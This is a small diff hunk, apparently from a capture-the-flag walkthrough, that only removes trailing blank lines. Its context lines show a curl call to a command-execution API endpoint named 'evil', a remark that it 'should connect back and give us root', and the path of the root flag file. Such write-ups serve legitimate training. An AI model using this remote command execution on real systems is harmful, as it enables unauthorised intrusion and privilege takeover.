@@ -185,5 +185,3 @@ curl -s -k -u admin https://localhost:8443/api/v1/queries/evil/commands/execute?
 This should connect back and give us root!
 
 Root.txt is in C:\Users\Administrator\Desktop\root.txt
-
-
